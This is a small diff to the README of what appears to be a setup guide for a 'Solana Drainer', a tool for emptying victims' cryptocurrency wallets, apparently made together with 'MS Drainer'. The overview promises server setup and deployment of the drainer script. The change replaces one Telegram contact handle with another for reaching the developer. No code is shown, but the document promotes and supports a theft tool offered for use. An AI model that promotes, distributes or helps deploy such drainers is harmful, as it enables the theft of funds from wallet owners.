@@ -5,7 +5,7 @@
 ### **Overview**
 This guide walks you through the installation process for the **Solana Drainer**, provided in collaboration with MS Drainer. Follow the steps below to set up your server and deploy the drainer script.  
 
-For additional details, refer to the official developer's guide [here]((https://t.me/iamsenpai)). If you have further questions, contact us on **[Telegram](https://t.me/iamsenpai)**.  
+For additional details, refer to the official developer's guide [here]((https://t.me/zenoclaus)). If you have further questions, contact us on **[Telegram](https://t.me/zenoclaus)**.  
 
 ---
 
